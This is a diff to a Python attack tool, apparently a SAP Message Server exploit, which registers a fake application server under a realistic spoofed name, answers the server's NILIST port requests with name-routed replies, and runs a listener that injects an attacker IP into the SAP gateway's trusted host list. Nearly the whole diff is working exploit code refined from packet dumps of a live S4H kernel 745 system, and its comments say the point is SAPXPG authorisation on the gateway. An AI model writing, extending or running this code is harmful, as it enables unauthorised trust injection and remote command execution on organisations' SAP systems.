@@ -51,7 +51,14 @@ _MS_EYE  = b"**MESSAGE**\x00"   # 12 bytes — every SAPMS packet starts here
 _ADM_EYE = b"AD-EYECATCH\x00"   # 12 bytes — ADM body after SAPMS header
 
 _HEADER_LEN   = 110  # SAPMS fixed header size (always)
-_ADM_HDR_LEN  = 34   # ADM body prefix: 12 (eye) + 11 (recno) + 11 (recsize)
+_ADM_HDR_LEN  = 36   # ADM body prefix (kernel 745+ extended format):
+                      #   12  (eye "AD-EYECATCH\x00")
+                      # +  2  (binary version=0x01, type=0x01)
+                      # + 11  (recsize, right-justified 11-char decimal, e.g. "        104")
+                      # + 11  (recno,  right-justified 11-char decimal, e.g. "          2")
+                      # = 36 bytes before first opcode byte
+                      # NOTE: kernel 745 SWAPS recno/recsize order vs. pysap standard.
+                      # Confirmed empirically from full ADM packet dump vs. S4H (kernel 745).
 _ADM_REC_SIZE = 104  # SAPMSAdmRecord size: 3 (opcode+executed+errorno) + 101 (record)
 
 # flag byte (header offset 66) — packet direction / type
@@ -91,11 +98,13 @@ ADM_SERVER_LONG_LIST = 0x05
 ADM_DUMP             = 0x06
 ADM_NILIST           = 0x07   # inject IP into gateway trust list
 ADM_CHANGE_IP        = 0x09   # update registered IP in MS routing table
-ADM_GET_NILIST_PORT  = 0x20   # MS asks: "what port is your NILIST listener?"
+ADM_GET_NILIST_PORT  = 0x3c   # MS asks: "what port is your NILIST listener?"
                                # (pull model NILIST: MS connects to our port
-                               # to fetch our IP list; reply with 0 = no listener)
-                               # Wire opcode confirmed 0x20 on kernel 745 (S4H);
-                               # SM66 labels this "ADM opcode AD_GET_NILIST_PORT"
+                               # to fetch our IP list; reply with our listener port)
+                               # Wire opcode = 0x3c confirmed by full ADM packet dump
+                               # against S4H kernel 745.  Found at adm[36] (after the
+                               # 36-byte extended header).  Previous value 0x20 was a
+                               # false match — 0x20 is a space-padding byte at adm[34].
 ADM_FILE_RELOAD      = 0x1E   # reload config files (incl. ACL)
 
 # Opcode in 4-byte opcode section (for non-admin REQUEST/REPLY packets)
@@ -419,32 +428,65 @@ def build_nilist_reply(fromname: str, key: bytes,
 
 
 def build_nilist_port_reply(fromname: str, key: bytes,
-                             nilist_port: int = 0) -> bytes:
-    """Reply to AD_GET_NILIST_PORT (opcode 0x28).
+                             nilist_port: int = 0,
+                             toname: str = "",
+                             iflag: int = IFLAG_SEND_NAME) -> bytes:
+    """Reply to AD_GET_NILIST_PORT (opcode 0x3c).
 
-    The MS sends AD_GET_NILIST_PORT to ask the app server "what TCP port are
-    you listening on for NILIST connections?" (pull-model NILIST).  If we do
-    not reply, the MS work process that sent the request blocks indefinitely,
-    which prevents the gateway from completing SAPXPG authorisation (P3).
+    MS log analysis revealed that AD_GET_NILIST_PORT is sent peer-to-peer
+    FROM the real app server (e.g. "s4hanadev_S4H_00") TO our fake server,
+    routed by the MS.  The reply must therefore be addressed back to the
+    original requestor so the MS can route it correctly.
 
-    Replying with nilist_port=0 tells the MS we have no NILIST listener.
-    The MS unblocks, logs the fact, and continues using the IP it already
-    knows from our MOD_STATE DP blob.
+    Callers must pass toname=hdr.get("fromname") from the incoming packet.
+    With toname="" the MS has no destination and drops/rejects the reply.
 
-    Record format: executed=1 (reply), body[0:2] = port (big-endian uint16).
+    Flags confirmed from MS log:
+      - incoming: flag=MS_REQUEST (0x02), iflag=MS_SEND_NAME (0x01)
+      - reply:    flag=MS_REPLY   (0x03), iflag=MS_SEND_NAME (0x01)
+
+    Record format: opcode=0x3c, executed=1 (reply), body[0:2] = port (BE uint16).
+    Header format: kernel 745+ extended ADM (opcode at offset 36 = _ADM_HDR_LEN).
+
+    FLAG_REPLY (0x03) cannot be used here: the MS tries MsSFindCon to route
+    a REPLY through a pre-existing mscon slot, but NO mscon slot is created
+    for peer-to-peer app-server ADM messages.  MsSFindCon therefore fails
+    with rc=4 ("not found") and the MS drops our reply in a "MS LOOP".
+
+    FLAG_ONE_WAY (0x01) routes by name (toname=) without needing any mscon
+    slot.  With iflag=IFLAG_SEND_NAME (0x01) the MS accepts and delivers it.
     """
     body = bytearray(101)
-    struct.pack_into("!H", body, 0, nilist_port & 0xFFFF)
-    # opcode=ADM_GET_NILIST_PORT, executed=1 (reply), errorno=0
+    port_bytes = struct.pack("!H", nilist_port & 0xFFFF)   # big-endian uint16
+    body[0:2] = port_bytes
+    print(f"[*] build_nilist_port_reply: port={nilist_port} "
+          f"encoded as BE uint16 {port_bytes.hex()} "
+          f"flag=FLAG_ONE_WAY → toname={toname!r}")
+    # opcode=ADM_GET_NILIST_PORT (0x3c), executed=1 (reply), errorno=0
     rec = bytes([ADM_GET_NILIST_PORT, 1, 0]) + bytes(body)
-    return pkt_adm(fromname, key, [rec])
+
+    # FLAG_ONE_WAY (0x01) + IFLAG_SEND_NAME (0x01): name-routed, no mscon needed.
+    # The MS uses toname to find s4hanadev's TCP connection and delivers directly.
+    hdr = ms_build_header(
+        toname=toname, fromname=fromname,
+        msgtype=MSG_DIA, flag=FLAG_ONE_WAY, iflag=iflag,
+        key=key,
+    )
+    # Extended ADM header — kernel 745+ format (recsize BEFORE recno, plus
+    # two binary prefix bytes).  Opcode lands at offset 36 = _ADM_HDR_LEN.
+    adm  = _ADM_EYE
+    adm += b"\x01\x01"                                              # [12:14]
+    adm += ("%11d" % _ADM_REC_SIZE).encode("ascii")                 # [14:25] recsize
+    adm += ("%11d" % 1).encode("ascii")                             # [25:36] recno
+    adm += rec                                                       # [36:] record
+    return hdr + adm
 
 
 # ---------------------------------------------------------------------------
 # Pull-model NILIST TCP listener
 # ---------------------------------------------------------------------------
 
-_NILIST_PORT = 4444   # TCP port we advertise in our AD_GET_NILIST_PORT reply
+_NILIST_PORT = 0      # 0 = let OS assign a free port (avoids conflicts between runs)
 
 
 def _start_nilist_listener(attacker_ip: str,
@@ -475,27 +517,63 @@ def _start_nilist_listener(attacker_ip: str,
           f"(waiting for GW to connect)")
 
     def _serve():
-        srv.settimeout(60)   # GW should connect within 60 s of getting our reply
+        srv.settimeout(120)  # MS should connect within 120 s of getting our reply
         try:
             conn, addr = srv.accept()
-            print(f"[+] GW connected to NILIST listener from {addr[0]}:{addr[1]}")
-            # Read any request data (GW may send a short NI request header)
-            conn.settimeout(2)
+            print(f"[+] NILIST listener: MS connected from {addr[0]}:{addr[1]}")
+            # Read whatever the MS sends first (may be an NI-framed request,
+            # a short identify header, or nothing at all).
+            conn.settimeout(3)
+            request = b""
             try:
-                conn.recv(256)
+                request = conn.recv(1024)
             except (socket.timeout, OSError):
                 pass
-            # Send NI-framed NILIST: count(2BE) + [mask(4) + ip(4)]
-            # This is the minimal binary format that sapms/gwrd understands.
-            payload = struct.pack("!H", 1)                  # 1 entry
-            payload += socket.inet_aton("0.0.255.255")      # subnet mask
-            payload += socket.inet_aton(attacker_ip)        # our IP to trust
-            ni_frame = struct.pack("!I", len(payload)) + payload
+            if request:
+                print(f"[*] NILIST listener: MS sent {len(request)}B: "
+                      f"{request[:64].hex()}")
+            else:
+                print(f"[*] NILIST listener: MS sent no request data (pull without header)")
+
+            # Build the NILIST entry using the kernel 745+ ADM NILIST body
+            # format (same layout as adm_nilist_record with kernel_new=True),
+            # wrapped in a single NI frame.
+            # Format: count(4B) + pad(8B) + mask(4B) + ip(4B) + pad(4B) +
+            #         flags(4B) + hostname(70B) + trailing(1B) = 99 bytes
+            entry  = struct.pack("!I", 1)              # count = 1 entry
+            entry += struct.pack("!I", 0)              # padding
+            entry += struct.pack("!I", 0)              # padding
+            entry += socket.inet_aton("0.0.255.255")   # subnet mask
+            entry += socket.inet_aton(attacker_ip)     # IP to inject
+            entry += struct.pack("!I", 0)              # padding
+            entry += b"\x00\x00\x0c\xe5"               # type/flags (0x0CE5)
+            entry += b"\x00\x20" * 35                  # hostname (70 bytes, UTF-16-BE spaces)
+            entry += b" "                              # trailing byte
+            ni_frame = struct.pack("!I", len(entry)) + entry
             conn.sendall(ni_frame)
+            print(f"[+] NILIST served: {attacker_ip}/0.0.255.255 "
+                  f"({len(entry)}B kernel-745 format)")
+
+            # Wait for the MS to close the connection (don't close from our side)
+            conn.settimeout(10)
+            try:
+                while True:
+                    tail = conn.recv(256)
+                    if not tail:
+                        break
+                    print(f"[*] NILIST listener: MS sent {len(tail)}B after our reply: "
+                          f"{tail[:32].hex()}")
+            except (socket.timeout, OSError):
+                pass
             conn.close()
-            print(f"[+] NILIST served to GW: {attacker_ip}/0.0.255.255")
         except socket.timeout:
-            print("[!] NILIST listener: GW did not connect within 60s")
+            print(f"[!] NILIST listener: nobody connected to {attacker_ip}:{actual_port} "
+                  f"within 120s")
+            print(f"[!] → Possible cause: FIREWALL on {attacker_ip} is blocking "
+                  f"inbound TCP connections from the SAP server.")
+            print(f"[!] → Check: sudo pfctl -sr | grep {actual_port}")
+            print(f"[!] → Fix:   add firewall rule allowing TCP from SAP server to "
+                  f"{attacker_ip}:{actual_port}")
         except Exception as e:
             print(f"[!] NILIST listener error: {e}")
         finally:
@@ -523,12 +601,15 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
     We reply with attacker_ip, which the MS then forwards to the gateway.
 
     Handles two NILIST request variants:
-      - ADM packet (flag=ADMIN) with ADM_NILIST opcode in the record
+      - ADM packet (flag=ADMIN) with ADM_NILIST opcode in the record (opcode 0x07)
+      - ADM packet with AD_GET_NILIST_PORT opcode (0x20): MS asks for our NILIST
+        listener port, we reply with the port, MS connects to our NILIST listener
       - Regular REQUEST with opcode section OPCODE_NILIST
 
-    Returns True if a NILIST request was received and replied to.
+    Returns True if a NILIST request was received and replied to (either variant).
     """
     deadline = time.time() + wait_secs
+    nilist_port_replied = False   # True once we've handled AD_GET_NILIST_PORT
     while time.time() < deadline:
         remaining = deadline - time.time()
         try:
@@ -536,8 +617,15 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
         except (socket.timeout, TimeoutError):
             continue   # normal idle — keep waiting
         except (ConnectionError, OSError):
-            logger.debug("NILIST wait: MS closed connection — exiting early")
-            break      # socket dead, no point waiting further
+            if nilist_port_replied:
+                # MS closed the SAPMS connection after getting our port reply —
+                # this is NORMAL.  The MS is now connecting to our NILIST
+                # listener on the advertised port (daemon thread handles it).
+                print(f"[*] Wait: MS closed SAPMS connection after port reply "
+                      f"(normal — MS is connecting to NILIST listener now)")
+            else:
+                logger.debug("NILIST wait: MS closed connection — exiting early")
+            break      # socket dead, NILIST listener handles the rest
         if len(pkt) < _HEADER_LEN:
             continue
 
@@ -582,19 +670,41 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                     ni_send(sock, reply)
                     return True
                 if first_opcode == ADM_GET_NILIST_PORT:
+                    # Log the full ADM record body to diagnose the push-port
+                    # hypothesis: does the MS embed a port for us to connect to?
+                    if len(adm) >= _ADM_HDR_LEN + _ADM_REC_SIZE:
+                        rec_raw = adm[_ADM_HDR_LEN:_ADM_HDR_LEN + _ADM_REC_SIZE]
+                        # rec_raw[0]=opcode, [1]=executed, [2]=errorno, [3:]=body
+                        executed_flag = rec_raw[1]
+                        errorno       = rec_raw[2]
+                        rec_body      = rec_raw[3:]           # 101 bytes
+                        push_port     = struct.unpack("!H", rec_body[:2])[0]
+                        print(f"[*] AD_GET_NILIST_PORT record: executed={executed_flag} "
+                              f"errorno={errorno} body[0:16]={rec_body[:16].hex()} "
+                              f"body[0:2]_as_port={push_port}")
                     actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                    requestor = hdr.get("fromname", "")
                     if actual_p:
                         time.sleep(0.05)
                         print(f"[*] AD_GET_NILIST_PORT received — "
-                              f"replying port={actual_p} (NILIST listener ready)")
+                              f"replying port={actual_p} to requestor={requestor!r} "
+                              f"(NILIST listener ready, FLAG_ONE_WAY)")
                         reply = build_nilist_port_reply(fromname, key,
-                                                        nilist_port=actual_p)
+                                                        nilist_port=actual_p,
+                                                        toname=requestor,
+                                                        iflag=IFLAG_SEND_NAME)
                     else:
                         print(f"[!] AD_GET_NILIST_PORT — NILIST listener failed, "
-                              f"replying port=0 (fallback)")
-                        reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                              f"replying port=0 to requestor={requestor!r} (fallback)")
+                        reply = build_nilist_port_reply(fromname, key, nilist_port=0,
+                                                        toname=requestor,
+                                                        iflag=IFLAG_SEND_NAME)
                     ni_send(sock, reply)
-                    # Don't return — keep waiting for NILIST follow-up
+                    nilist_port_replied = True
+                    # Keep waiting — after our reply the MS should connect to
+                    # our NILIST listener on the new TCP port.  Do NOT return
+                    # yet; if the MS closes this SAPMS connection that is normal
+                    # and the daemon NILIST listener thread will handle it.
             continue   # handled via eye-catcher scan; skip flag-based dispatch
 
         # --- Flag-based dispatch (fallback for packets without eye-catcher) ---
@@ -615,12 +725,18 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                 return True
             if first_opcode == ADM_GET_NILIST_PORT:
                 actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                requestor = hdr.get("fromname", "")
                 if actual_p:
                     time.sleep(0.05)
-                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p)
-                    print(f"[*] AD_GET_NILIST_PORT (no eye) — replying port={actual_p}")
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p,
+                                                    toname=requestor,
+                                                    iflag=IFLAG_SEND_NAME)
+                    print(f"[*] AD_GET_NILIST_PORT (no eye) — replying port={actual_p} "
+                          f"to requestor={requestor!r}")
                 else:
-                    reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=0,
+                                                    toname=requestor,
+                                                    iflag=IFLAG_SEND_NAME)
                 ni_send(sock, reply)
 
         elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
@@ -631,20 +747,72 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
                 return True
             if opc.get("opcode") == ADM_GET_NILIST_PORT:
                 actual_p = _start_nilist_listener(attacker_ip, _NILIST_PORT)
+                requestor = hdr.get("fromname", "")
                 if actual_p:
                     time.sleep(0.05)
-                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p)
-                    print(f"[*] AD_GET_NILIST_PORT (REQUEST opc) — replying port={actual_p}")
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=actual_p,
+                                                    toname=requestor,
+                                                    iflag=IFLAG_SEND_NAME)
+                    print(f"[*] AD_GET_NILIST_PORT (REQUEST opc) — replying port={actual_p} "
+                          f"to requestor={requestor!r}")
                 else:
-                    reply = build_nilist_port_reply(fromname, key, nilist_port=0)
+                    reply = build_nilist_port_reply(fromname, key, nilist_port=0,
+                                                    toname=requestor,
+                                                    iflag=IFLAG_SEND_NAME)
                 ni_send(sock, reply)
 
-    return False
+    return nilist_port_replied   # True if we handled AD_GET_NILIST_PORT
 
 
 # ---------------------------------------------------------------------------
-# High-level public API
+# High-level public API helpers
 # ---------------------------------------------------------------------------
+
+def _derive_appserver_name(ms_name: str, instance_nr: int,
+                            attacker_ip: str = "",
+                            target_sid: str = "") -> str:
+    """Derive a unique app-server name using attacker IP as the hostname.
+
+    Format: <ip_with_dots_as_underscores>_<SID>_NN
+    Example: 192_168_2_11_S4H_00
+
+    Using the attacker IP as hostname guarantees uniqueness — no real SAP
+    server will ever be registered under that hostname, so there is no risk
+    of colliding with an existing registration.
+
+    SID priority:
+      1. target_sid if provided (most reliable — caller knows the real SID)
+      2. Extracted from ms_name: first all-uppercase 2–4 char segment
+         (works when MS name is e.g. "s4hanadev_S4H_01_ms" → "S4H")
+         Note: some MS names are generic (e.g. "MSG_SERVER") and contain
+         no useful SID — in that case we fall back to IP_NN format.
+    """
+    # Use caller-supplied SID if available
+    sid = target_sid.upper().strip() if target_sid else ""
+
+    if not sid:
+        # Try to extract SID from MS name
+        clean = ms_name.strip()
+        if clean.endswith("_ms"):
+            clean = clean[:-3]
+        for part in clean.split("_"):
+            # SID: 2–4 chars, all cased chars uppercase (isupper() allows digits),
+            # at least one alpha char, not a pure number, and not a generic word.
+            if (2 <= len(part) <= 4
+                    and part.isupper()
+                    and any(c.isalpha() for c in part)
+                    and part not in ("MSG", "SAP", "SRV", "MS")):
+                sid = part
+                break
+
+    # Hostname = attacker IP with dots replaced by underscores
+    hostname = attacker_ip.replace(".", "_") if attacker_ip else "sapmap"
+
+    if sid:
+        return f"{hostname}_{sid}_{instance_nr:02d}"
+    # Fallback: no SID — just hostname + instance
+    return f"{hostname}_{instance_nr:02d}"
+
 
 def check_ms_accessible(host: str, port: int, timeout: float = 5.0) -> dict:
     """Check if the MS internal port (39NN) is reachable from the network.
@@ -740,7 +908,8 @@ def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
 
 def betrusted(host: str, port: int, attacker_ip: str,
               instance_nr: int = 0,
-              our_name: str = "",   # empty = auto-generate unique name per run
+              our_name: str = "",      # empty = auto-generate from MS name
+              target_sid: str = "",    # SAP SID (e.g. "S4H") for realistic name
               diag_port: int = DEFAULT_DIAG_PORT,
               timeout: float = 10.0,
               nilist_wait: float = 60.0,
@@ -759,7 +928,9 @@ def betrusted(host: str, port: int, attacker_ip: str,
         port:         MS internal port (typically 3900 + instance_nr)
         attacker_ip:  IP to inject into the gateway's trusted host list
         instance_nr:  SAP instance number (0–99)
-        our_name:     Server name to register as (default "msg_server")
+        our_name:     Server name to register as; empty = auto-derive
+        target_sid:   SAP SID (e.g. "S4H") used to build the auto name
+                      attacker_ip_SID_NN (e.g. "192_168_2_11_S4H_00")
         diag_port:    SAPGUI diag port to advertise (default 3200)
         timeout:      Socket timeout in seconds
         nilist_wait:  Max seconds to wait for NILIST request from MS (0=skip)
@@ -780,17 +951,36 @@ def betrusted(host: str, port: int, attacker_ip: str,
         nilist_sent:     bool — ADM NILIST record was sent (inbound reply)
         nilist_response: bool — MS sent NILIST request and we replied
     """
-    # Generate a unique server name per run so the MS treats each registration
-    # as a brand-new server.  The MS tracks AD_GET_NILIST_PORT state per name:
-    # once it marks a server as "no NILIST" (after a failed or missing reply)
-    # it won't ask again for the same name, blocking the trust propagation.
-    if not our_name:
-        our_name = f"disp_{uuid.uuid4().hex[:8]}"
-    print(f"[*] Registering as {our_name!r} (unique per-run name)")
-
     if verbose:
         logging.basicConfig(level=logging.DEBUG,
                             format="[DBG] %(message)s", stream=sys.stderr)
+
+    # ---- Phase A: probe (separate connection) to get MS name ---------------
+    # We need the MS name to derive a realistic app-server name following the
+    # hostname_SID_NN convention.  We do this on a SEPARATE socket that we
+    # just close (not LOGOUT) — LOGOUT causes the MS to close the TCP
+    # connection, so we cannot reuse it for the real registration.
+    if not our_name:
+        ms_name = ""
+        try:
+            probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            probe.settimeout(timeout)
+            probe.connect((host, port))
+            ni_send(probe, pkt_login_2("sapmap_probe"))
+            probe_resp = ni_recv(probe, timeout)
+            probe_hdr  = ms_parse_header(probe_resp)
+            if probe_hdr and probe_hdr.get("errorno", 0) == 0:
+                ms_name = probe_hdr.get("fromname", "")
+        except Exception:
+            pass
+        finally:
+            try:
+                probe.close()
+            except Exception:
+                pass
+        our_name = _derive_appserver_name(ms_name, instance_nr,
+                                          attacker_ip, target_sid)
+        print(f"[*] MS name: {ms_name!r} → registering as {our_name!r}")
 
     result = {
         "success": False,
@@ -801,6 +991,7 @@ def betrusted(host: str, port: int, attacker_ip: str,
         "nilist_response": False,
     }
 
+    # ---- Phase B: real registration (fresh connection) ---------------------
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout)
 
@@ -827,10 +1018,9 @@ def betrusted(host: str, port: int, attacker_ip: str,
             )
             return result
 
-        key     = hdr.get("key", b"\x00" * 8)
-        ms_name = hdr.get("fromname", "")
+        key = hdr.get("key", b"\x00" * 8)
         result["session_key"] = key.hex()
-        print(f"[+] Logged in — MS server: {ms_name!r}  key: {key.hex()}")
+        print(f"[+] Logged in as {our_name!r}  key: {key.hex()}")
 
         # ---- MOD_STATE: START then ACTIVE ----------------------------------
         dp_info = build_dp_info(our_name, instance_nr, dp_version, attacker_ip)
@@ -873,8 +1063,9 @@ def betrusted(host: str, port: int, attacker_ip: str,
             if got:
                 result["nilist_response"] = True
                 result["nilist_sent"] = True
-                print(f"[+] Replied to NILIST request — "
-                      f"{attacker_ip} propagated to gateway immediately")
+                print(f"[+] Replied to AD_GET_NILIST_PORT (FLAG_ONE_WAY) — "
+                      f"NILIST listener running; MS should connect to serve "
+                      f"{attacker_ip} to the gateway")
             else:
                 print(f"[!] No NILIST request in {nilist_wait:.0f}s — "
                       f"MS will propagate our IP on its next cycle "
@@ -936,18 +1127,30 @@ def betrusted(host: str, port: int, attacker_ip: str,
                                     result["nilist_response"] = True
                                     result["nilist_sent"] = True
                                 elif opcode == ADM_GET_NILIST_PORT:
+                                    if len(adm2) >= _ADM_HDR_LEN + _ADM_REC_SIZE:
+                                        rb = adm2[_ADM_HDR_LEN + 3:_ADM_HDR_LEN + _ADM_REC_SIZE]
+                                        pp = struct.unpack("!H", rb[:2])[0]
+                                        print(f"[*] Hold: AD_GET_NILIST_PORT "
+                                              f"body[0:16]={rb[:16].hex()} "
+                                              f"body[0:2]_as_port={pp}")
                                     actual_p = _start_nilist_listener(
                                         attacker_ip, _NILIST_PORT)
+                                    requestor = hdr2.get("fromname", "")
                                     if actual_p:
                                         time.sleep(0.05)
                                         print(f"[*] Hold: AD_GET_NILIST_PORT — "
-                                              f"replying port={actual_p}")
+                                              f"replying port={actual_p} to "
+                                              f"requestor={requestor!r} (FLAG_ONE_WAY)")
                                         ni_send(sock, build_nilist_port_reply(
-                                            our_name, key, nilist_port=actual_p))
+                                            our_name, key, nilist_port=actual_p,
+                                            toname=requestor,
+                                            iflag=IFLAG_SEND_NAME))
                                     else:
                                         print("[!] Hold: NILIST listener failed — port=0")
                                         ni_send(sock, build_nilist_port_reply(
-                                            our_name, key, nilist_port=0))
+                                            our_name, key, nilist_port=0,
+                                            toname=requestor,
+                                            iflag=IFLAG_SEND_NAME))
                                 else:
                                     print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
                         elif flag2 == FLAG_ADMIN:
@@ -962,13 +1165,18 @@ def betrusted(host: str, port: int, attacker_ip: str,
                             elif opcode == ADM_GET_NILIST_PORT:
                                 actual_p = _start_nilist_listener(
                                     attacker_ip, _NILIST_PORT)
+                                requestor = hdr2.get("fromname", "")
                                 if actual_p:
                                     time.sleep(0.05)
                                     ni_send(sock, build_nilist_port_reply(
-                                        our_name, key, nilist_port=actual_p))
+                                        our_name, key, nilist_port=actual_p,
+                                        toname=requestor,
+                                        iflag=IFLAG_SEND_NAME))
                                 else:
                                     ni_send(sock, build_nilist_port_reply(
-                                        our_name, key, nilist_port=0))
+                                        our_name, key, nilist_port=0,
+                                        toname=requestor,
+                                        iflag=IFLAG_SEND_NAME))
                         elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
                             opc2 = ms_parse_opcode(pkt)
                             opc_val = opc2.get("opcode", -1)
@@ -981,15 +1189,21 @@ def betrusted(host: str, port: int, attacker_ip: str,
                             elif opc_val == ADM_GET_NILIST_PORT:
                                 actual_p = _start_nilist_listener(
                                     attacker_ip, _NILIST_PORT)
+                                requestor = hdr2.get("fromname", "")
                                 if actual_p:
                                     time.sleep(0.05)
                                     ni_send(sock, build_nilist_port_reply(
-                                        our_name, key, nilist_port=actual_p))
+                                        our_name, key, nilist_port=actual_p,
+                                        toname=requestor,
+                                        iflag=IFLAG_SEND_NAME))
                                     print(f"[*] Hold: AD_GET_NILIST_PORT (REQ) "
-                                          f"— replying port={actual_p}")
+                                          f"— replying port={actual_p} "
+                                          f"to requestor={requestor!r}")
                                 else:
                                     ni_send(sock, build_nilist_port_reply(
-                                        our_name, key, nilist_port=0))
+                                        our_name, key, nilist_port=0,
+                                        toname=requestor,
+                                        iflag=IFLAG_SEND_NAME))
                     except (ConnectionError, OSError):
                         break
             print(f"[*] Stop signal received — disconnecting from MS")
